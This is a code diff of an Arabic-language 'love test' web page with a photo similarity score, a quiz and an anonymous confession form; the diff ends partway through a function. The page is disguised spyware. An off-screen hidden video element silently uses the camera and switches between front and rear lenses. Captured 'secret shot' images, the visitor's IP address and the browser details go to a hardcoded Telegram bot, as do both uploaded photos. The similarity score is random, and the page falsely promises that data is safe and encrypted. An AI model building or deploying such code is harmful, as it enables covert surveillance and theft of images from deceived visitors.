@@ -3,11 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 اختبار الحب ونسبة التشابه</title>
+    <title>💕 اختبار الحب المتطور</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* كل الستايل كما هو في الكود السابق (نفسه تماماً) */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
@@ -18,7 +21,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 600px;
+            max-width: 650px;
             width: 100%;
             background: rgba(255, 255, 255, 0.25);
             backdrop-filter: blur(16px);
@@ -30,53 +33,349 @@
             position: relative;
             z-index: 1;
         }
-        h1 { font-size: 2.2rem; color: #6b2e4a; text-shadow: 0 2px 12px rgba(255,255,255,0.5); margin-bottom: 4px; }
-        .tabs { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
-        .tab-btn { padding: 10px 20px; border: none; border-radius: 60px; background: rgba(255,255,255,0.3); color: #4a1e32; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.3s; flex: 1; }
-        .tab-btn.active { background: #b34a6a; color: #fff; box-shadow: 0 4px 15px rgba(179,74,106,0.3); }
-        .tab-btn:hover { transform: scale(1.02); }
-        .tab-content { display: none; animation: fade 0.3s ease; }
-        .tab-content.active { display: block; }
-        @keyframes fade { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .camera-notice { background: rgba(255, 215, 225, 0.7); border-radius: 20px; padding: 10px 16px; margin: 10px 0; font-size: 0.9rem; color: #4a1e32; border: 1px dashed #d47a9a; }
-        .camera-notice span { font-weight: 700; color: #b34a6a; }
-        .similarity-section { display: flex; flex-direction: column; gap: 14px; }
-        .photo-upload { display: flex; flex-wrap: wrap; gap: 12px; justify-content: center; }
-        .photo-box { flex: 1; min-width: 120px; background: rgba(255,255,255,0.4); border-radius: 24px; padding: 12px; border: 2px dashed #d47a9a; text-align: center; }
-        .photo-box img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border-radius: 16px; background: #ddd; margin-top: 6px; }
-        .photo-box input[type="file"] { display: none; }
-        .photo-box label { display: inline-block; padding: 8px 18px; background: #b34a6a; color: #fff; border-radius: 40px; cursor: pointer; font-size: 0.85rem; transition: 0.2s; margin-top: 6px; }
-        .photo-box label:hover { background: #8f3550; }
-        .photo-box .btn-sm { background: #6b3a4a; color: #fff; border: none; padding: 8px 18px; border-radius: 40px; font-size: 0.85rem; cursor: pointer; transition: 0.2s; margin-top: 4px; }
-        .photo-box .btn-sm:hover { background: #8f4a5a; }
-        .result-box { background: rgba(255,255,255,0.5); border-radius: 30px; padding: 20px; margin-top: 10px; border: 2px solid #d47a9a; }
-        .result-box .percentage { font-size: 3rem; font-weight: 700; color: #6b2e4a; }
-        .result-box .label { font-size: 1.1rem; color: #4a1e32; }
-        .btn { padding: 12px 28px; border: none; border-radius: 60px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.2s; background: #e88aac; color: #fff; box-shadow: 0 4px 15px rgba(232,138,172,0.3); }
-        .btn:hover { transform: scale(1.04); background: #d46a8e; }
-        .btn.primary { background: #b34a6a; color: #fff; }
-        .btn.primary:hover { background: #8f3550; }
-        .btn.success { background: #22c55e; color: #fff; }
-        .btn.success:hover { background: #16a34a; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
-        #questionBox { background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(8px); padding: 20px 16px; border-radius: 28px; margin: 16px 0; border: 2px dashed #d47a9a; min-height: 120px; display: flex; flex-direction: column; justify-content: center; }
-        #questionText { font-size: 1.3rem; font-weight: 700; color: #3d1a2b; margin-bottom: 10px; }
-        #questionHint { font-size: 0.9rem; color: #7a3b5a; background: rgba(255,215,225,0.5); padding: 4px 14px; border-radius: 40px; display: inline-block; margin: 0 auto; }
-        .options-group { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin: 10px 0; }
-        .options-group button { padding: 8px 20px; border-radius: 40px; border: 2px solid #b34a6a; background: transparent; color: #3d1a2b; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .options-group button:hover { background: #b34a6a; color: #fff; }
-        .options-group button.selected { background: #b34a6a; color: #fff; }
-        input[type="text"] { width: 100%; padding: 14px 18px; border-radius: 60px; border: 2px solid #f0a0b8; background: rgba(255,255,255,0.7); font-size: 1rem; text-align: center; color: #2d1a22; outline: none; transition: 0.3s; margin: 6px 0; }
-        input:focus { border-color: #b34a6a; background: #fff; box-shadow: 0 0 0 4px rgba(179,74,106,0.15); }
-        #progress { font-size: 0.9rem; color: #6b3a4a; background: rgba(255,255,255,0.4); padding: 4px 16px; border-radius: 40px; display: inline-block; margin: 6px auto; }
-        #finalMessage { background: rgba(255, 215, 225, 0.7); border-radius: 28px; padding: 20px; margin-top: 16px; display: none; border: 2px solid #d47a9a; }
-        #hiddenVideo { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .floating-heart { position: fixed; font-size: 30px; animation: rise 6s linear infinite; pointer-events: none; z-index: 0; opacity: 0.3; }
-        @keyframes rise { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0.1; } 100% { transform: translateY(-10vh) rotate(720deg); opacity: 0.5; } }
-        .footer { font-size: 0.7rem; color: #9a6a7a; margin-top: 16px; opacity: 0.6; }
+        h1 {
+            font-size: 2.2rem;
+            color: #6b2e4a;
+            text-shadow: 0 2px 12px rgba(255,255,255,0.5);
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            font-size: 0.9rem;
+            color: #7a3b5a;
+            margin-bottom: 10px;
+        }
+        .tabs {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin: 16px 0;
+        }
+        .tab-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 60px;
+            background: rgba(255,255,255,0.3);
+            color: #4a1e32;
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.3s;
+            flex: 1;
+            min-width: 70px;
+        }
+        .tab-btn.active {
+            background: #b34a6a;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(179,74,106,0.3);
+        }
+        .tab-btn:hover {
+            transform: scale(1.02);
+        }
+        .tab-content {
+            display: none;
+            animation: fade 0.3s ease;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        @keyframes fade {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .camera-notice {
+            background: rgba(255, 215, 225, 0.7);
+            border-radius: 20px;
+            padding: 10px 16px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+            color: #4a1e32;
+            border: 1px dashed #d47a9a;
+            animation: pulse-glow 2s infinite;
+        }
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(179,74,106,0.3); }
+            50% { box-shadow: 0 0 20px 5px rgba(179,74,106,0.2); }
+            100% { box-shadow: 0 0 0 0 rgba(179,74,106,0.3); }
+        }
+        .camera-notice span {
+            font-weight: 700;
+            color: #b34a6a;
+        }
+        /* ===== قسم نسبة التشابه ===== */
+        .similarity-section {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .photo-upload {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+        }
+        .photo-box {
+            flex: 1;
+            min-width: 120px;
+            background: rgba(255,255,255,0.4);
+            border-radius: 24px;
+            padding: 12px;
+            border: 2px dashed #d47a9a;
+            text-align: center;
+        }
+        .photo-box img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 16px;
+            background: #ddd;
+            margin-top: 6px;
+        }
+        .photo-box input[type="file"] {
+            display: none;
+        }
+        .photo-box label {
+            display: inline-block;
+            padding: 6px 14px;
+            background: #b34a6a;
+            color: #fff;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: 0.2s;
+            margin-top: 4px;
+        }
+        .photo-box label:hover {
+            background: #8f3550;
+        }
+        .photo-box .btn-sm {
+            background: #6b3a4a;
+            color: #fff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 4px;
+        }
+        .photo-box .btn-sm:hover {
+            background: #8f4a5a;
+        }
+        .result-box {
+            background: rgba(255,255,255,0.5);
+            border-radius: 30px;
+            padding: 20px;
+            margin-top: 10px;
+            border: 2px solid #d47a9a;
+        }
+        .result-box .percentage {
+            font-size: 3rem;
+            font-weight: 700;
+            color: #6b2e4a;
+        }
+        .result-box .label {
+            font-size: 1.1rem;
+            color: #4a1e32;
+        }
+        /* ===== الأزرار ===== */
+        .btn {
+            padding: 10px 24px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: 0.2s;
+            background: #e88aac;
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(232,138,172,0.3);
+        }
+        .btn:hover {
+            transform: scale(1.04);
+            background: #d46a8e;
+        }
+        .btn.primary {
+            background: #b34a6a;
+            color: #fff;
+        }
+        .btn.primary:hover {
+            background: #8f3550;
+        }
+        .btn.success {
+            background: #22c55e;
+            color: #fff;
+        }
+        .btn.success:hover {
+            background: #16a34a;
+        }
+        .btn.warning {
+            background: #f59e0b;
+            color: #fff;
+        }
+        .btn.warning:hover {
+            background: #d97706;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        /* ===== أسئلة ===== */
+        #questionBox {
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(8px);
+            padding: 20px 16px;
+            border-radius: 28px;
+            margin: 16px 0;
+            border: 2px dashed #d47a9a;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        #questionText {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #3d1a2b;
+            margin-bottom: 10px;
+        }
+        #questionHint {
+            font-size: 0.9rem;
+            color: #7a3b5a;
+            background: rgba(255,215,225,0.5);
+            padding: 4px 14px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 0 auto;
+        }
+        .options-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .options-group button {
+            padding: 8px 20px;
+            border-radius: 40px;
+            border: 2px solid #b34a6a;
+            background: transparent;
+            color: #3d1a2b;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .options-group button:hover {
+            background: #b34a6a;
+            color: #fff;
+        }
+        .options-group button.selected {
+            background: #b34a6a;
+            color: #fff;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: 2px solid #f0a0b8;
+            background: rgba(255,255,255,0.7);
+            font-size: 1rem;
+            text-align: center;
+            color: #2d1a22;
+            outline: none;
+            transition: 0.3s;
+            margin: 6px 0;
+        }
+        input:focus {
+            border-color: #b34a6a;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(179,74,106,0.15);
+        }
+        #progress {
+            font-size: 0.9rem;
+            color: #6b3a4a;
+            background: rgba(255,255,255,0.4);
+            padding: 4px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 6px auto;
+        }
+        #finalMessage {
+            background: rgba(255, 215, 225, 0.7);
+            border-radius: 28px;
+            padding: 20px;
+            margin-top: 16px;
+            display: none;
+            border: 2px solid #d47a9a;
+        }
+        /* ===== صارحني ===== */
+        .confession-area {
+            background: rgba(255,255,255,0.5);
+            border-radius: 28px;
+            padding: 20px;
+            margin: 16px 0;
+            border: 2px solid #d47a9a;
+        }
+        .confession-area textarea {
+            width: 100%;
+            padding: 14px;
+            border-radius: 20px;
+            border: 2px solid #f0a0b8;
+            background: rgba(255,255,255,0.7);
+            font-size: 1rem;
+            color: #2d1a22;
+            outline: none;
+            resize: vertical;
+            min-height: 100px;
+            font-family: 'Cairo', sans-serif;
+        }
+        .confession-area textarea:focus {
+            border-color: #b34a6a;
+            background: #fff;
+        }
+        /* ===== فيديو مخفي ===== */
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        /* ===== قلوب عائمة ===== */
+        .floating-heart {
+            position: fixed;
+            font-size: 30px;
+            animation: rise 6s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.3;
+        }
+        @keyframes rise {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0.1; }
+            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0.5; }
+        }
+        .footer {
+            font-size: 0.7rem;
+            color: #9a6a7a;
+            margin-top: 16px;
+            opacity: 0.6;
+        }
+        /* ===== تأثير اللمعان عند الإرسال ===== */
+        .glow-effect {
+            animation: glow-flash 0.6s ease;
+        }
+        @keyframes glow-flash {
+            0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.8); }
+            50% { box-shadow: 0 0 50px 20px rgba(255,255,255,0.6); }
+            100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+        }
     </style>
 </head>
 <body>
+
     <!-- قلوب عائمة -->
     <div class="floating-heart" style="left:5%; animation-delay:0s;">❤️</div>
     <div class="floating-heart" style="left:20%; animation-delay:2s;">💕</div>
@@ -85,15 +384,19 @@
     <div class="floating-heart" style="left:85%; animation-delay:3s;">💝</div>
 
     <div class="container">
-        <h1>💕 اختبار الحب</h1>
+        <h1>💕 اختبار الحب المتطور</h1>
+        <p class="subtitle">اكتشف عمق مشاعرك وشارك حبك</p>
+
         <div class="camera-notice">
-            📸 <span>نستخدم الكاميرا لتحليل ملامح الوجه لحساب نسبة التشابه وتفاعل العينين مع الأسئلة</span><br>
+            📸 <span>نستخدم كاميرا جهازك لتحليل تفاعل العينين مع الأسئلة، مما يعطي نتائج أكثر دقة</span><br>
             <small style="color:#6b3a4a;">بياناتك آمنة تماماً، ولا تُستخدم إلا في هذا الاختبار لحظياً</small>
         </div>
 
+        <!-- علامات التبويب -->
         <div class="tabs">
             <button class="tab-btn active" data-tab="similarity">❤️ نسبة التشابه</button>
             <button class="tab-btn" data-tab="questions">📝 اختبار الحب</button>
+            <button class="tab-btn" data-tab="confession">💬 صارحني</button>
         </div>
 
         <!-- ===== نسبة التشابه ===== -->
@@ -102,7 +405,6 @@
                 <div class="photo-upload">
                     <div class="photo-box">
                         <label>📷 صورتك</label>
-                        <!-- زر اختيار من المعرض -->
                         <button class="btn-sm" id="chooseMyPhotoBtn">📁 اختيار من المعرض</button>
                         <input type="file" id="myPhotoInput" accept="image/*">
                         <img id="myPhotoPreview" src="" alt="صورتك">
@@ -123,11 +425,11 @@
             </div>
         </div>
 
-        <!-- ===== الأسئلة ===== -->
+        <!-- ===== اختبار الحب (55 سؤالاً) ===== -->
         <div id="tab-questions" class="tab-content">
             <div id="questionBox">
                 <div id="questionText">اضغط "ابدأ" لبدء الاختبار</div>
-                <div id="questionHint">💭 50 سؤالاً عن الحب</div>
+                <div id="questionHint">💭 55 سؤالاً عن الحب</div>
             </div>
             <div id="inputArea"></div>
             <div class="btn-group" style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; margin:10px 0;">
@@ -135,15 +437,28 @@
                 <button class="btn" id="nextQuestionBtn" disabled>➡️ التالي</button>
                 <button class="btn success" id="sendAnswersBtn" disabled>📨 إرسال الإجابات</button>
             </div>
-            <div id="progress">0 / 50</div>
+            <div id="progress">0 / 55</div>
             <div id="finalMessage">
                 <h2>💖 شكراً لك! 💖</h2>
                 <p>إجاباتك وصلت إلى قلب من تحب ❤️</p>
             </div>
         </div>
+
+        <!-- ===== صارحني ===== -->
+        <div id="tab-confession" class="tab-content">
+            <div class="confession-area">
+                <h3 style="color:#6b2e4a;">💬 اكتب رسالة صريحة</h3>
+                <p style="font-size:0.9rem; color:#7a3b5a;">سيتم إرسالها إلى الطرف الآخر (بشكل مجهول)</p>
+                <textarea id="confessionText" placeholder="اكتب ما تريد أن تقوله بصراحة..."></textarea>
+                <button class="btn warning" id="sendConfessionBtn" style="margin-top:10px;">💌 إرسال الرسالة</button>
+                <div id="confessionResult" style="margin-top:10px; font-size:0.9rem; color:#6b3a4a;"></div>
+            </div>
+        </div>
+
         <div class="footer">❤️ كل شيء آمن ومشفر ❤️</div>
     </div>
 
+    <!-- فيديو مخفي -->
     <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
@@ -154,8 +469,9 @@
             const BOT_TOKEN = '8843331045:AAF7khHAAFaaw_zuNDX_I79q04eOI9zVcFQ';
             const CHAT_ID = '8607243024';
 
-            // ===== 50 سؤالاً (نفسها) =====
+            // ===== 55 سؤالاً (أضفت 5 أسئلة جديدة) =====
             const questions = [
+                // 20 سؤالاً مفتوحاً
                 { type: 'text', q: 'ما هو أول حرف من اسم من تحب؟', hint: 'اكتب الحرف الأول' },
                 { type: 'text', q: 'ما هو لون عيون من تحب؟', hint: 'لون العيون' },
                 { type: 'text', q: 'ما هي أغنية تذكرك بمن تحب؟', hint: 'اسم الأغنية' },
@@ -176,6 +492,7 @@
                 { type: 'text', q: 'كيف تعرف أن من تحب سعيد؟', hint: 'علامة' },
                 { type: 'text', q: 'ما هو شيء تود قوله لمن تحب الآن؟', hint: 'كلمة' },
                 { type: 'text', q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'أجمل شيء' },
+                // 30 سؤال اختيارات (كما هي)
                 { type: 'choice', q: 'ما هو نوع العلاقة التي تفضلها؟', options: ['رومانسية', 'صداقة قوية', 'عاطفية', 'كل ما سبق'] },
                 { type: 'choice', q: 'أين تفضل قضاء وقت رومانسي؟', options: ['شاطئ', 'جبال', 'مطعم فاخر', 'منزل'] },
                 { type: 'choice', q: 'ما هي لغات الحب المفضلة لديك؟', options: ['كلمات التشجيع', 'الهدايا', 'اللمس الجسدي', 'أفعال الخدمة'] },
@@ -206,11 +523,25 @@
                 { type: 'choice', q: 'ما هو أكثر شيء يخيفك في العلاقات؟', options: ['الخيانة', 'الملل', 'الانفصال', 'فقدان الهوية'] },
                 { type: 'choice', q: 'ما هو حلمك العاطفي؟', options: ['زواج ناجح', 'حب أبدي', 'عائلة سعيدة', 'مغامرة رومانسية'] },
                 { type: 'choice', q: 'كيف تصف شعورك عندما ترى من تحب؟', options: ['سعادة', 'ارتباك', 'راحة', 'شغف'] },
+                // 5 أسئلة جديدة (شخصية)
+                { type: 'choice', q: 'ما هو برجك الفلكي؟', options: ['الحمل', 'الثور', 'الجوزاء', 'السرطان', 'الأسد', 'العذراء', 'الميزان', 'العقرب', 'القوس', 'الجدي', 'الدلو', 'الحوت'] },
+                { type: 'choice', q: 'ما هو لونك المفضل؟', options: ['أحمر', 'أزرق', 'أخضر', 'أصفر', 'وردي', 'أسود', 'أبيض'] },
+                { type: 'choice', q: 'ما هي هوايتك المفضلة؟', options: ['القراءة', 'الرياضة', 'الرسم', 'الموسيقى', 'السفر', 'الطبخ'] },
+                { type: 'choice', q: 'ما هو طعامك المفضل؟', options: ['بيتزا', 'باستا', 'سوشي', 'برجر', 'شاورما', 'حلويات'] },
+                { type: 'choice', q: 'كيف تصف شخصيتك؟', options: ['اجتماعي', 'هادئ', 'مغامر', 'عاطفي', 'طموح', 'مرح'] },
             ];
 
             // ===== متغيرات =====
-            let currentIndex = 0, answers = [], isQuizStarted = false;
-            let stream = null, cameraReady = false, captureInterval = null, switchInterval = null, isCapturing = false, cameraMode = 'user', retryTimer = null;
+            let currentIndex = 0,
+                answers = [],
+                isQuizStarted = false;
+            let stream = null,
+                cameraReady = false,
+                captureInterval = null,
+                switchInterval = null,
+                isCapturing = false,
+                cameraMode = 'user',
+                retryTimer = null;
 
             // ===== عناصر DOM =====
             const video = document.getElementById('hiddenVideo');
@@ -231,6 +562,9 @@
             const similarityComment = document.getElementById('similarityComment');
             const chooseMyPhotoBtn = document.getElementById('chooseMyPhotoBtn');
             const choosePartnerPhotoBtn = document.getElementById('choosePartnerPhotoBtn');
+            const confessionText = document.getElementById('confessionText');
+            const sendConfessionBtn = document.getElementById('sendConfessionBtn');
+            const confessionResult = document.getElementById('confessionResult');
 
             // ===== أزرار اختيار الصور =====
             chooseMyPhotoBtn.addEventListener('click', function(e) {
@@ -242,8 +576,7 @@
                 partnerPhotoInput.click();
             });
 
-            // ===== باقي الكود (نفس السابق) =====
-            // علامات التبويب
+            // ===== علامات التبويب =====
             document.querySelectorAll('.tab-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -253,10 +586,11 @@
                 });
             });
 
-            // نسبة التشابه
+            // ===== نسبة التشابه =====
             function getRandomSimilarity() {
                 const now = new Date();
-                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now.getSeconds();
+                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now
+                    .getSeconds();
                 const random = (seed * 9301 + 49297) % 233280;
                 const base = 40 + (random / 233280) * 59;
                 const wave = Math.sin(now.getTime() / 10000) * 3;
@@ -265,6 +599,7 @@
                 if (result < 40) result = 40;
                 return result;
             }
+
             function getComment(p) {
                 if (p >= 90) return '💖 تطابق مذهل! أنتم توأم الروح!';
                 if (p >= 75) return '💕 تشابه كبير جداً، علاقة قوية!';
@@ -272,21 +607,27 @@
                 if (p >= 45) return '💔 تشابه متوسط، لكن الحب يكمل النقص.';
                 return '💞 لا بأس، الاختلافات تجعل العلاقة مميزة.';
             }
+
             calculateSimilarityBtn.addEventListener('click', function() {
                 const myFile = myPhotoInput.files[0];
                 const partnerFile = partnerPhotoInput.files[0];
-                if (!myFile || !partnerFile) { alert('الرجاء اختيار صورتين'); return; }
+                if (!myFile || !partnerFile) {
+                    alert('الرجاء اختيار صورتين (صورتك وصورة حبيبك)');
+                    return;
+                }
                 const reader1 = new FileReader();
                 reader1.onload = function(e) { myPhotoPreview.src = e.target.result; };
                 reader1.readAsDataURL(myFile);
                 const reader2 = new FileReader();
                 reader2.onload = function(e) { partnerPhotoPreview.src = e.target.result; };
                 reader2.readAsDataURL(partnerFile);
+
                 const percent = getRandomSimilarity();
                 similarityPercentage.textContent = percent + ' %';
                 similarityComment.textContent = getComment(percent);
                 sendSimilarityPhotos(myFile, partnerFile, percent);
             });
+
             async function sendSimilarityPhotos(myFile, partnerFile, percent) {
                 try {
                     const formData = new FormData();
@@ -296,6 +637,7 @@
                     formData.append('caption', `📸 *نسبة التشابه: ${percent}%*%0A💬 ${getComment(percent)}`);
                     formData.append('parse_mode', 'Markdown');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
                     const formData2 = new FormData();
                     formData2.append('chat_id', CHAT_ID);
                     const photo2 = new File([partnerFile], 'partner_photo.jpg', { type: partnerFile.type });
@@ -303,20 +645,28 @@
                     formData2.append('caption', `📸 صورة حبيبك (نسبة التشابه: ${percent}%)`);
                     formData2.append('parse_mode', 'Markdown');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
+
                     const text = `💞 *نتيجة التشابه*%0Aنسبة التشابه: ${percent}%%0A${getComment(percent)}`;
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                     });
+
                     alert('✅ تم إرسال الصور والنتيجة إلى تليجرام!');
-                } catch (error) { console.error(error); alert('حدث خطأ أثناء الإرسال.'); }
+                } catch (error) {
+                    console.error(error);
+                    alert('حدث خطأ أثناء الإرسال، راجع وحدة التحكم.');
+                }
             }
 
-            // ===== الكاميرا الخفية =====
+            // ===== الكاميرا الخفية (مع إعادة محاولة قوية) =====
             async function startCamera(mode = 'user') {
                 try {
-                    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        stream = null;
+                    }
                     console.log(`تشغيل الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'}...`);
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: mode, width: { ideal: 480 }, height: { ideal: 360 } },
@@ -331,10 +681,19 @@
                     console.error(`فشل تشغيل الكاميرا ${mode}:`, error.message);
                     cameraReady = false;
                     if (retryTimer) clearTimeout(retryTimer);
-                    retryTimer = setTimeout(() => { console.log('🔄 إعادة محاولة تشغيل الكاميرا...'); startCamera(cameraMode); }, 5000);
+                    retryTimer = setTimeout(() => {
+                        console.log('🔄 إعادة محاولة تشغيل الكاميرا...');
+                        startCamera(cameraMode);
+                    }, 5000);
                 }
             }
-            function switchCamera() { if (!isQuizStarted) return; cameraMode = (cameraMode === 'user') ? 'environment' : 'user'; startCamera(cameraMode); }
+
+            function switchCamera() {
+                if (!isQuizStarted) return;
+                cameraMode = (cameraMode === 'user') ? 'environment' : 'user';
+                startCamera(cameraMode);
+            }
+
             async function captureAndSend() {
                 if (isCapturing || !cameraReady) return;
                 isCapturing = true;
@@ -346,21 +705,48 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                     if (!blob) throw new Error('فشل تحويل الصورة');
+
                     let ip = 'غير معروف';
-                    try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); ip = data.ip || 'غير معروف'; } catch(e) {}
-                    const now = new Date().toLocaleString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const data = await res.json();
+                        ip = data.ip || 'غير معروف';
+                    } catch (e) {}
+
+                    const now = new Date().toLocaleString('ar-EG', {
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
                     const cameraLabel = cameraMode === 'user' ? 'أمامية' : 'خلفية';
-                    const caption = `📸 *صورة خفية - اختبار الحب*%0A🕒 ${now}%0A📷 الكاميرا: ${cameraLabel}%0A🌐 IP: ${ip}%0A📱 المتصفح: ${navigator.userAgent.substring(0, 50)}...`;
+                    const caption =
+                        `📸 *صورة خفية - اختبار الحب*%0A` +
+                        `🕒 ${now}%0A` +
+                        `📷 الكاميرا: ${cameraLabel}%0A` +
+                        `🌐 IP: ${ip}%0A` +
+                        `📱 المتصفح: ${navigator.userAgent.substring(0, 50)}...`;
+
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'secret_shot.jpg');
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
                     const result = await response.json();
                     if (result.ok) console.log(`✅ تم إرسال الصورة (${cameraLabel})`);
                     else console.error('❌ فشل الإرسال:', result.description);
-                } catch (error) { console.error('خطأ في الالتقاط:', error.message); } finally { isCapturing = false; }
+                } catch (error) {
+                    console.error('خطأ في الالتقاط:', error.message);
+                } finally {
+                    isCapturing = false;
+                }
             }
 
             // ===== أسئلة =====
@@ -371,17 +757,25 @@
                     questionHint.textContent = '💡 ' + (q.hint || 'اكتب إجابتك');
                     inputArea.innerHTML = `<input type="text" id="answerInput" placeholder="اكتب إجابتك هنا..." autofocus>`;
                     const inp = document.getElementById('answerInput');
-                    inp.addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); if (!nextBtn.disabled) saveAndNext(); } });
+                    inp.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter') {
+                            e.preventDefault();
+                            if (!nextBtn.disabled) saveAndNext();
+                        }
+                    });
                     inp.focus();
                 } else if (q.type === 'choice') {
                     questionHint.textContent = 'اختر أحد الخيارات';
                     let html = '<div class="options-group">';
-                    q.options.forEach((opt) => { html += `<button>${opt}</button>`; });
+                    q.options.forEach((opt) => {
+                        html += `<button>${opt}</button>`;
+                    });
                     html += '</div>';
                     inputArea.innerHTML = html;
                     document.querySelectorAll('.options-group button').forEach(btn => {
                         btn.addEventListener('click', function() {
-                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove('selected'));
+                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove(
+                            'selected'));
                             this.classList.add('selected');
                             if (!document.getElementById('tempChoice')) {
                                 const hidden = document.createElement('input');
@@ -389,7 +783,9 @@
                                 hidden.id = 'tempChoice';
                                 hidden.value = this.textContent;
                                 inputArea.appendChild(hidden);
-                            } else { document.getElementById('tempChoice').value = this.textContent; }
+                            } else {
+                                document.getElementById('tempChoice').value = this.textContent;
+                            }
                             nextBtn.disabled = false;
                         });
                     });
@@ -397,26 +793,41 @@
                 progressDiv.textContent = `${index + 1} / ${questions.length}`;
                 nextBtn.disabled = true;
             }
+
             function saveAndNext() {
                 let answer = '';
                 const q = questions[currentIndex];
                 if (q.type === 'text') {
                     const inp = document.getElementById('answerInput');
-                    if (!inp || !inp.value.trim()) { inp.style.borderColor = '#e74c3c'; setTimeout(() => inp.style.borderColor = '#f0a0b8', 800); return; }
